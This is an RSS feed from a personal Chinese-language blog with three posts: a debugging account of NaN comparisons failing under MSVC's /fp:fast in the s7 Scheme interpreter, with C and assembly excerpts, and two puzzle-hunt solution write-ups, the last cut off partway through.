<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>ᕦʕ •ᴥ•ʔᕤ</title>
    <link>https://wind1900.github.io/</link>
    <description>Recent content on ᕦʕ •ᴥ•ʔᕤ</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>wind1900</copyright>
    <lastBuildDate>Sun, 17 Nov 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://wind1900.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>浮点数里的NAN</title>
      <link>https://wind1900.github.io/bug/%E6%B5%AE%E7%82%B9%E6%95%B0%E9%87%8C%E7%9A%84nan/</link>
      <pubDate>Sun, 17 Nov 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/bug/%E6%B5%AE%E7%82%B9%E6%95%B0%E9%87%8C%E7%9A%84nan/</guid>
      <description>起因 最近在给一个Scheme语言写测试，要测的函数是 positive? 和 negative? ，很简单，就是判断一个实数的正负。为了使测试覆盖到更多的情况，在测试用例里特别加了 NaN ，根据文档里的说法，应该都返回 #f 即 false 才对。本地测试也没问题，然而发了PR后CI里的测试结果确有问题，linux和mac的测试环境里能跑过，windows上有一个测试一直出错，错误的地方如下：&#xA;(positive? 0.0) =&amp;gt; #t (negative? 0.0) =&amp;gt; #f 而在mac上是这样的：&#xA;(positive? +nan.0) =&amp;gt; #f (negative? +nan.0) =&amp;gt; #f 调查 发现这个问题后我首先有了两个想法：会不会是NaN的值在不同平台表示形式是不一样的，导致比较大小的结果不一样？为什么在windows上会显示0.0而不是+nan.0？ 针对显示为0.0的问题，我先用了更多的用例进行测试，对比mac和windows的结果来判断是否把NaN当成0来输出了：&#xA;(&amp;gt; 0.0 +nan.0) (&amp;lt; 0.0 +nan.0) (= 0.0 +nan.0) (&amp;gt; 0.0 0.0) (&amp;lt; 0.0 0.0) (= 0.0 0.0) 在mac和windows上的结果如下：&#xA;mac windows (&amp;gt; 0.0 +nan.0) #f #t (&amp;lt; 0.0 +nan.0) #f #f (= 0.0 +nan.0) #f #t (&amp;gt; 0.</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
起因
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>最近在给一个Scheme语言写测试，要测的函数是 <code>positive?</code> 和 <code>negative?</code> ，很简单，就是判断一个实数的正负。为了使测试覆盖到更多的情况，在测试用例里特别加了 <code>NaN</code> ，根据<a href="https://standards.scheme.org/official/r7rs.pdf">文档</a>里的说法，应该都返回 <code>#f</code> 即 <code>false</code> 才对。本地测试也没问题，然而发了PR后CI里的测试结果确有问题，linux和mac的测试环境里能跑过，windows上有一个测试一直出错，错误的地方如下：</p>
<div class="src src-scheme">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scheme" data-lang="scheme"><span style="display:flex;"><span>  (positive? <span style="color:#ae81ff">0.0</span>) <span style="color:#66d9ef">=&gt; </span><span style="color:#66d9ef">#t</span>
</span></span><span style="display:flex;"><span>  (negative? <span style="color:#ae81ff">0.0</span>) <span style="color:#66d9ef">=&gt; </span><span style="color:#66d9ef">#f</span></span></span></code></pre></div>
</div>
<p>而在mac上是这样的：</p>
<div class="src src-scheme">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scheme" data-lang="scheme"><span style="display:flex;"><span>  (positive? +nan<span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">=&gt; </span><span style="color:#66d9ef">#f</span>
</span></span><span style="display:flex;"><span>  (negative? +nan<span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">=&gt; </span><span style="color:#66d9ef">#f</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
调查
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>发现这个问题后我首先有了两个想法：会不会是NaN的值在不同平台表示形式是不一样的，导致比较大小的结果不一样？为什么在windows上会显示0.0而不是+nan.0？
针对显示为0.0的问题，我先用了更多的用例进行测试，对比mac和windows的结果来判断是否把NaN当成0来输出了：</p>
<div class="src src-scheme">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scheme" data-lang="scheme"><span style="display:flex;"><span>  (&gt; <span style="color:#ae81ff">0.0</span> +nan<span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  (&lt; <span style="color:#ae81ff">0.0</span> +nan<span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  (= <span style="color:#ae81ff">0.0</span> +nan<span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  (&gt; <span style="color:#ae81ff">0.0</span> <span style="color:#ae81ff">0.0</span>)
</span></span><span style="display:flex;"><span>  (&lt; <span style="color:#ae81ff">0.0</span> <span style="color:#ae81ff">0.0</span>)
</span></span><span style="display:flex;"><span>  (= <span style="color:#ae81ff">0.0</span> <span style="color:#ae81ff">0.0</span>)</span></span></code></pre></div>
</div>
<p>在mac和windows上的结果如下：</p>
<table>
<tbody>
<tr>
<td></td>
<td>mac</td>
<td>windows</td>
</tr>
<tr>
<td>(&gt; 0.0 +nan.0)</td>
<td>#f</td>
<td>#t</td>
</tr>
<tr>
<td>(&lt; 0.0 +nan.0)</td>
<td>#f</td>
<td>#f</td>
</tr>
<tr>
<td>(= 0.0 +nan.0)</td>
<td>#f</td>
<td>#t</td>
</tr>
<tr>
<td>(&gt; 0.0 0.0)</td>
<td>#f</td>
<td>#f</td>
</tr>
<tr>
<td>(&lt; 0.0 0.0)</td>
<td>#f</td>
<td>#f</td>
</tr>
<tr>
<td>(= 0.0 0.0)</td>
<td>#t</td>
<td>#t</td>
</tr>
</tbody>
</table>
<p>通过前三行和后三行的对比，可知程序中并没有把NaN当作0.0在操作。下面就来研究为什么会显示成0.0，这部分源码在<a href="https://cm-gitlab.stanford.edu/bil/s7/-/blob/master/s7.c?ref_type=heads#L14701">s7.c</a>中的函数 <code>dtoa_filter_special</code></p>
<div class="src src-cpp">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>  <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int32_t</span> <span style="color:#a6e22e">dtoa_filter_special</span>(<span style="color:#66d9ef">double</span> fp, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dest, <span style="color:#66d9ef">bool</span> neg)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> bits;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> nan;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> <span style="color:#ae81ff">0.0</span>)
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        dest[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>; dest[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span>; dest[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    bits <span style="color:#f92672">=</span> dtoa_get_dbits(fp);
</span></span><span style="display:flex;"><span>    nan <span style="color:#f92672">=</span> (bits <span style="color:#f92672">&amp;</span> dtoa_expmask) <span style="color:#f92672">==</span> dtoa_expmask;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>nan) <span style="color:#66d9ef">return</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    ......</span></span></code></pre></div>
</div>
<p>在本地调试的时候发现，传进来的fp的值就是NaN（也就是说之前第一个想法是错的），然后会判断是否和0相等，如果等于，就会把要输出的字符串dest设为&#34;0.0&#34;，也就是报错机器上显示的结果。
这样看来，在报错机器上确实存在NaN和0比较结果“不对”的情况，而 <code>positive?</code> 和 <code>negative?</code> 也是通过与0判断实现的，因此也受到了影响。<br>
从上面的测试可以看出NaN即小于0又等于0，这样的数肯定是不存在的。再试几个其它数与NaN比较，发现任意非正实数都会比NaN大。那究竟是什么导致了这个结果呢？<br>
这时我已经没思路了，后来项目上的另一个师兄后来发现，是vc的编译选项导致的（<a href="https://learn.microsoft.com/en-us/cpp/build/reference/fp-specify-floating-point-behavior?view=msvc-170">/fp Specify floating-point behavior</a>）。在CI里用了 <code>/fp:fast</code> 所以结果不正确，改成 <code>/fp:precise</code> 三个平台测试结果就一致没问题了。</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
继续研究
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p>IEEE754中其实说明了NaN在浮点数中有相对应的表示，比如在我本地测试的时候，它的值为0x7ff8000000000000。在上面的转字符串代码中，也使用了相应的方法判断是否是NaN： <code>nan = (bits &amp; dtoa_expmask) == dtoa_expmask</code><br>
那为什么会出现不一样的结果呢？首先看看不同编译选项生成的汇编代码是否相同，这里对比了好久也没发现异样。幸好在另一位大佬的帮助下才发现原来问题就出在不同的汇编代码，之前眼花没发现。。比如:<br>
<code>NaN&lt;0</code> 的结果不同，因为二者汇编代码分别为:</p>
<ul>
<li>默认情况（/fp:precise）</li>
</ul>
<div class="src src-asm">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xorps</span>   <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">comisd</span>  <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">NaNValue</span> (<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jbe</span>     <span style="color:#66d9ef">main</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x41</span></span></span></code></pre></div>
</div>
<ul>
<li>/fp:fast的情况</li>
</ul>
<div class="src src-asm">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">movsd</span>   <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">NaNValue</span> (<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">comisd</span>  <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">real@0000000000000000</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jae</span>     <span style="color:#66d9ef">main</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x46</span></span></span></code></pre></div>
</div>
<p>使用了不同比较方式和判断指令</p>
<p>
<code>NaN==0</code> 结果不同，因为二者汇编代码分别为:</p>
<ul>
<li>默认情况</li>
</ul>
<div class="src src-asm">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">movsd</span>   <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">NaNValue</span> (<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ucomisd</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">real@0000000000000000</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jp</span>      <span style="color:#66d9ef">main</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6f</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jne</span>     <span style="color:#66d9ef">main</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x6f</span></span></span></code></pre></div>
</div>
<ul>
<li>/fp:fast的情况</li>
</ul>
<div class="src src-asm">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">movsd</span>   <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">NaNValue</span> (<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ucomisd</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">mmword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">real@0000000000000000</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jne</span>     <span style="color:#66d9ef">main</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x72</span></span></span></code></pre></div>
</div>
<p>多了一个判断指令</p>
<p>
也就是说，不管在哪种编译选项下，汇编指令运行得到的结果都是一致的，而是编译器通过生成不同的指令而达到令NaN比较结果不一样的效果</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>JustHunt总结四</title>
      <link>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E5%9B%9B/</link>
      <pubDate>Tue, 15 Oct 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E5%9B%9B/</guid>
      <description>口口杀人事件 题目 大家好啊，我是推批，今天我来图书馆借一些书看。进入阅览室，我轻车熟路地找到了那串神圣的代号：I313.45，可是一番查找后竟然一本我想要的书都没有找到。于是我来到一台计算机前进行检索，这才发现原来是图书馆的管理员粗心大意把书 摆错了位置 。顺带一提这家图书馆的检索系统还有自动和谐功能，只不过似乎 搞错了应该被和谐抹去的那两个字 。以下是我的检索记录（注：下述年度榜单的名字为玩梗，与解题无关）：&#xA;题名：口口杀人事件&#xA;书架：U46&#xA;作者简介：无论什么事都要等吃完晚饭再说。&#xA;摘要：从东京驶向川崎的口口，司机竟然在高速行驶过程中被人杀死，监控显示死亡时间前后从未有其它口口接近过。凶手究竟是如何做到的？“这本本格推理小说好了不起，想读！”年度榜单第 10 位（共入围 29 本）。&#xA;题名：口口杀人事件&#xA;书架：G627&#xA;作者简介：年轻时曾出过一张专辑。&#xA;摘要：一座小岛上小学的口口被杀死在农田中，案发当时口口正带领学生们在田间进行劳动实践，但所有学生一致声称没有见到可疑人员靠近。难道凶手会在这些小学生之中？“这本本格推理小说好了不起，想读！”年度榜单第 5 位（共入围 15 本）。&#xA;题名：口口杀人事件&#xA;书架：K991&#xA;作者简介：最近迷上了天竺鼠车车。&#xA;摘要：在口口同为九十的两地同时发生行人遭遇枪击事件，警方联合调查显示竟是同一人所为。凶手难道会分身之术？“这本本格推理小说好了不起，想读！”年度榜单第 4 位（共入围 18 本）。&#xA;题名：口口杀人事件&#xA;书架：J613.2&#xA;作者简介：据说住在一个虚幻的城堡里。&#xA;摘要：乐队的贝斯手遭人杀害，案发现场出现的几个血书的口口扰乱了警方调查的脚步。案发时乐队的其他成员在进行一场演出，全部都有不在场证明，但这些口口的排列正是演出内容中的一部分。看似板上钉钉的不在场证明该如何破解？“这本本格推理小说好了不起，想读！”年度榜单第 9 位（共入围 9 本）。&#xA;题名：口口杀人事件&#xA;书架：K977.8&#xA;作者简介：东大高材生，学得最好的课是逻辑学。&#xA;摘要：口口的一个村庄中出现了一座吃人的井，村民发现井上面经常浮现出人的面容，但什么也捞不上来。不久那些人竟陆续惨死家中。这究竟是灵异事件还是有人在其中作祟？“这本本格推理小说好了不起，想读！”年度榜单第 10 位（共入围 27 本）。&#xA;题名：口口杀人事件&#xA;书架：TS941.713&#xA;作者简介：黑白通吃。&#xA;摘要：时隔多年，北海道再次发现一具无头女尸，将受害者用乙醚迷晕的作案手法如出一辙，这次的线索只有尸体身上的一条口口。依然是逻辑流，新生代作家对经典作品的致敬之作。“这本本格推理小说好了不起，想读！”年度榜单第 1 位（共入围 16 本）。&#xA;题名：口口杀人事件&#xA;书架：TS941.712&#xA;作者简介：在中国大连长大。&#xA;摘要：北海道的鲇川海岸发现一具无头男尸，身份难以确定，唯一的线索只有尸体身上的一套口口。侦探能从这一套口口出发展开怒涛般的逻辑流推演最终锁定凶手吗？“这本本格推理小说好了不起，想读！”年度榜单第 3 位（共入围 12 本）。&#xA;题名：口口杀人事件&#xA;书架：TS943.3&#xA;作者简介：好像只会写短篇小说。&#xA;摘要：一群人来到大山深处的别墅做客，果不其然因为暴风雪来临被困。不久，其中一人的尸体在雪地中被发现，现场竟然留下了两人的脚印。然而不幸的是，所有人外出所穿的鞋都只剩下了口口！侦探能通过口口判断出凶手是谁吗？“这本本格推理小说好了不起，想读！”榜单第 10 位（共入围 10+8 本）。</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
口口杀人事件
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<div id="outline-container-headline-2" class="outline-3">
<h3 id="headline-2">
题目
</h3>
<div id="outline-text-headline-2" class="outline-text-3">
<p>大家好啊，我是推批，今天我来图书馆借一些书看。进入阅览室，我轻车熟路地找到了那串神圣的代号：I313.45，可是一番查找后竟然一本我想要的书都没有找到。于是我来到一台计算机前进行检索，这才发现原来是图书馆的管理员粗心大意把书 <strong>摆错了位置</strong> 。顺带一提这家图书馆的检索系统还有自动和谐功能，只不过似乎 <strong>搞错了应该被和谐抹去的那两个字</strong> 。以下是我的检索记录（注：下述年度榜单的名字为玩梗，与解题无关）：</p>
<p>
题名：口口杀人事件<br>
书架：U46<br>
作者简介：无论什么事都要等吃完晚饭再说。<br>
摘要：从东京驶向川崎的口口，司机竟然在高速行驶过程中被人杀死，监控显示死亡时间前后从未有其它口口接近过。凶手究竟是如何做到的？“这本本格推理小说好了不起，想读！”年度榜单第 10 位（共入围 29 本）。</p>
<p>
题名：口口杀人事件<br>
书架：G627<br>
作者简介：年轻时曾出过一张专辑。<br>
摘要：一座小岛上小学的口口被杀死在农田中，案发当时口口正带领学生们在田间进行劳动实践，但所有学生一致声称没有见到可疑人员靠近。难道凶手会在这些小学生之中？“这本本格推理小说好了不起，想读！”年度榜单第 5 位（共入围 15 本）。</p>
<p>
题名：口口杀人事件<br>
书架：K991<br>
作者简介：最近迷上了天竺鼠车车。<br>
摘要：在口口同为九十的两地同时发生行人遭遇枪击事件，警方联合调查显示竟是同一人所为。凶手难道会分身之术？“这本本格推理小说好了不起，想读！”年度榜单第 4 位（共入围 18 本）。</p>
<p>
题名：口口杀人事件<br>
书架：J613.2<br>
作者简介：据说住在一个虚幻的城堡里。<br>
摘要：乐队的贝斯手遭人杀害，案发现场出现的几个血书的口口扰乱了警方调查的脚步。案发时乐队的其他成员在进行一场演出，全部都有不在场证明，但这些口口的排列正是演出内容中的一部分。看似板上钉钉的不在场证明该如何破解？“这本本格推理小说好了不起，想读！”年度榜单第 9 位（共入围 9 本）。</p>
<p>
题名：口口杀人事件<br>
书架：K977.8<br>
作者简介：东大高材生，学得最好的课是逻辑学。<br>
摘要：口口的一个村庄中出现了一座吃人的井，村民发现井上面经常浮现出人的面容，但什么也捞不上来。不久那些人竟陆续惨死家中。这究竟是灵异事件还是有人在其中作祟？“这本本格推理小说好了不起，想读！”年度榜单第 10 位（共入围 27 本）。</p>
<p>
题名：口口杀人事件<br>
书架：TS941.713<br>
作者简介：黑白通吃。<br>
摘要：时隔多年，北海道再次发现一具无头女尸，将受害者用乙醚迷晕的作案手法如出一辙，这次的线索只有尸体身上的一条口口。依然是逻辑流，新生代作家对经典作品的致敬之作。“这本本格推理小说好了不起，想读！”年度榜单第 1 位（共入围 16 本）。</p>
<p>
题名：口口杀人事件<br>
书架：TS941.712<br>
作者简介：在中国大连长大。<br>
摘要：北海道的鲇川海岸发现一具无头男尸，身份难以确定，唯一的线索只有尸体身上的一套口口。侦探能从这一套口口出发展开怒涛般的逻辑流推演最终锁定凶手吗？“这本本格推理小说好了不起，想读！”年度榜单第 3 位（共入围 12 本）。</p>
<p>
题名：口口杀人事件<br>
书架：TS943.3<br>
作者简介：好像只会写短篇小说。<br>
摘要：一群人来到大山深处的别墅做客，果不其然因为暴风雪来临被困。不久，其中一人的尸体在雪地中被发现，现场竟然留下了两人的脚印。然而不幸的是，所有人外出所穿的鞋都只剩下了口口！侦探能通过口口判断出凶手是谁吗？“这本本格推理小说好了不起，想读！”榜单第 10 位（共入围 10+8 本）。</p>
<p>
检索后我不禁产生了疑惑：明明都是 <strong>日本作家的书</strong> ，为什么 <strong>标题翻译得这么像是范·达因的作品</strong> 啊？为了搞清楚这些书原来的名字，除了修复和谐系统的错误外，我想我还需要再借两本词典才行（注：你不需要真的获取这两本词典以解决此题）：</p>
<p>
题名：汉英大辞典
摘要：本书是由著名英语学家、词典编纂专家吴光华先生主编的一部大型综合性汉英类词典。由上海交通大学出版社出版的前两个版本，累计印数达 10 万册，曾获第 8 届中国图书奖。</p>
<p>
题名：和英语林集成
摘要：这是一本在 1867 年时，由赴日行医的美国长老会牧师詹姆斯·柯蒂斯·赫本以汉字署名“美国平文”于横滨编纂发行的日英－英日双语辞典。</p>
<p>
几天后，我终于将这些书按 <strong>由远到近的顺序</strong> 阅读完毕。为什么我要一下子读这么多本书呢？原来我最喜欢的作者的新书马上就要发售了，但是这位作者是个“泄底狂魔”，总是在书中剧透别的作家的书（注：本题与某二开头的作家无关）。这一次，他提前发布“犯罪预告”，声称将要泄底这八本书，因此不得不先读完了。今天就是新书发售的日子了，在前往书店的路上，我不禁好奇，解决这一次事件(3 2 3)的将会是谁(5 7)呢？</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-3">
<h3 id="headline-3">
解析
</h3>
<div id="outline-text-headline-3" class="outline-text-3">
<p>首先关注加粗的文字，口口都是被和谐的字，范·达因的作品大多都是以“The+6个字母的英文单字+Murder Case”命名，另外都是日本作家的书，这些信息和书架以及作者简介、摘要联合起来，可以得出一个日本的推理小说家和他的一部作品<br>
比如第一个书架U46表示汽车工程分类，与汽车相关的单词可以是car，摘要里的口口填入汽车刚好是一句通顺的话。作者简介的意思其实是《推理要在晚餐后》这个小说，作者名字叫东川笃哉，东川这两个字也在摘要第一句中出现。然后car+case又是另一个单词carcase，是尸体的意思，所以我们要找的书是东川笃哉写的《请勿在此丢弃尸体》，其余几个也是靠这种联系找到最后的作品</p>
<table>
<thead>
<tr>
<th>书架</th>
<th>分类</th>
<th>口口</th>
<th>case</th>
<th>作者</th>
<th>简介</th>
<th>书名</th>
</tr>
</thead>
<tbody>
<tr>
<td>G627</td>
<td>学校管理</td>
<td>校长</td>
<td>headcase</td>
<td>岛田庄司</td>
<td>专辑《LONELY MEN》</td>
<td>摩天楼的怪人</td>
</tr>
<tr>
<td>K991</td>
<td>地图</td>
<td>经度</td>
<td>longcase</td>
<td>绫辻行人</td>
<td>喜欢天竺鼠车车</td>
<td>钟表馆事件</td>
</tr>
<tr>
<td>J613.2</td>
<td>读谱法、记谱法</td>
<td>音符</td>
<td>notecase</td>
<td>江户川乱步</td>
<td>自传《幻影城主》</td>
<td>二分铜币</td>
</tr>
<tr>
<td>K977.8</td>
<td>秘鲁</td>
<td>秘鲁</td>
<td>percase</td>
<td>井上真伪</td>
<td>东大毕业</td>
<td>那种可能性早已料及</td>
</tr>
<tr>
<td>TS941.713</td>
<td>内衣</td>
<td>衬裙</td>
<td>slipcase</td>
<td>乙一</td>
<td>有黑乙一和白乙一两种风格</td>
<td>箱庭图书馆</td>
</tr>
<tr>
<td>TS941.712</td>
<td>西装</td>
<td>西装</td>
<td>suitcase</td>
<td>鲇川哲也</td>
<td>在中国大连长大</td>
<td>黑色皮箱</td>
</tr>
<tr>
<td>TS943.3</td>
<td>制鞋工艺</td>
<td>鞋帮</td>
<td>uppercase</td>
<td>大山诚一郎</td>
<td>著书基本上全部为短篇集</td>
<td>字母表谜案</td>
</tr>
</tbody>
</table>
<p>
然后再根据《和英语林集成》，需要找到这几本书的平文式罗马字，根据榜单排名提取字母，并根据出版时间排序，得到了areonthe(case)。提交后得到新的信息，一个口号“任何时间，任何地点，……”，需要找到是哪个侦探
那就是“Anytime, anyplace, the <strong>Super Sleuths</strong>, are on the case!”
<figure><img src="https://wind1900.github.io/picx-images-hosting/supersleuths.syxtoniir.webp"/>
</figure>
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-4" class="outline-2">
<h2 id="headline-4">
读者自行验证
</h2>
<div id="outline-text-headline-4" class="outline-text-2">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/image.7pa7fee9j.webp"/>
</figure>

<figure><img src="https://wind1900.github.io/picx-images-hosting/image.7ax5n1l3up.webp"/>
</figure>

看上去都是些很难的数学题，完全不想计算。但其实搜索一下就会发现它们都有对应的数学定理，所以只要读懂题目，和定理的描述，就能很快找到答案了</p>
<table>
<thead>
<tr>
<th>定理</th>
<th class="align-right">答案</th>
</tr>
</thead>
<tbody>
<tr>
<td>Aztec diamond Theorem</td>
<td class="align-right">7</td>
</tr>
<tr>
<td>Koebe quarter Theorem</td>
<td class="align-right">15</td>
</tr>
<tr>
<td>Chvatals art gallery Theorem</td>
<td class="align-right">23</td>
</tr>
<tr>
<td>Friendship Theorem</td>
<td class="align-right">28</td>
</tr>
<tr>
<td>Sylvester Gallai Theorem</td>
<td class="align-right">31</td>
</tr>
</tbody>
</table>
<p>
后面的提取略过，并没什么意思，不过题到了一个<a href="https://oeis.org">找数列规律的网站</a>，值得收藏</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>JustHunt总结三</title>
      <link>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E4%B8%89/</link>
      <pubDate>Wed, 09 Oct 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/justhunt%E6%80%BB%E7%BB%93%E4%B8%89/</guid>
      <description>聚字成语 又是一个由8个小题组成的题目，每道题的颜色都不一样，最后所有颜色汇总成一个题。注意题目中的后两个字也暗示了本题的主题 第一个BNH很容易查到是“了”的五笔，然后发现这些句子去掉一个字都是成语：春梦（了）无痕，河东狮（子）吼，冰心（在）玉壶，口（有）蜜腹（有）剑，难能（而）可贵，绝无（而）仅有，绝世（而）独立，（不）怨天（不）尤人，怒发（上）冲冠，万籁（此）俱寂，沧海（之）一粟，视死（忽）如归，冰雪（净）聪明，花前（即）月下。把多的字的五笔编码都列出来刚好能对应上不同的蓝色，得到“印” 第二小题都是四个音调都包含的成语，那根据四个音调不同排列对应不同的字母，很容易想到康托排列，下面的成语提取出“used twice”，只有“不”字在这些成语中使用了两次 三十六个字表示了九个成语，变成27个单词说明一个成语对应了三个单词，这些单词很奇怪，但翻译后可以尝试凑成一个意思类似的成语，如：赏心乐事，胡天胡地，俊采星驰，百感交集，望子成龙，心如死灰，牙牙学语，分形同气，三星高照。然后观察到每个单词都有一个字母红色放大，这些字母只有ACGU，三个一组一般用来表示氨基酸的密码子，对应一个字母，得到“pitch sing”，代表音高和唱，那和他俩再能组成成语的就是“亢”字了 这个题题目里有一个成语，但是其中一个字换成了另一个同音字，还把这个改过的成语解释了一下，意思没变，那么下面应该也是一些有一个同音字的同意成语，分别为：口若悬河（核），毁方投圆（原），币重言（盐）甘，弹（蛋）丸之地，逐鹿（路）中原，从善如登（灯），萍（瓶）水相逢，刻（氪）舟求剑，乐而（儿）忘返，逝者如斯（思），祸（货）从天降，花天酒地（帝），再用数字提取得到“handle period”，二者组合得到“拘” 这个题开始没做出来，解析上说都是一些只有一个字差别的成语，如百无一堪/百无一漏/百无一是/百无一用，告/观/鉴/数往知来，一无所长/得/取/有/知，无所不包/可/能/通/为/在/至，一饭/壶/刻/诺/笑/掷/字千金，填进去后把红色字串起来得到“一往无前” 这个题说了不是成语，而是四字词语，后面的数字代表了英文和拼音的长度，这些词分别是：罗曼蒂克，可口可乐，扑热息痛，阿弥陀佛，歇斯底里，盖世太保，普罗大众，提取后得到“not yet”，即为“未” 这题我只做了黑色的部分，把单词填进去后，看起来都是一些成语的英文直译，提取出黑色的是“weight 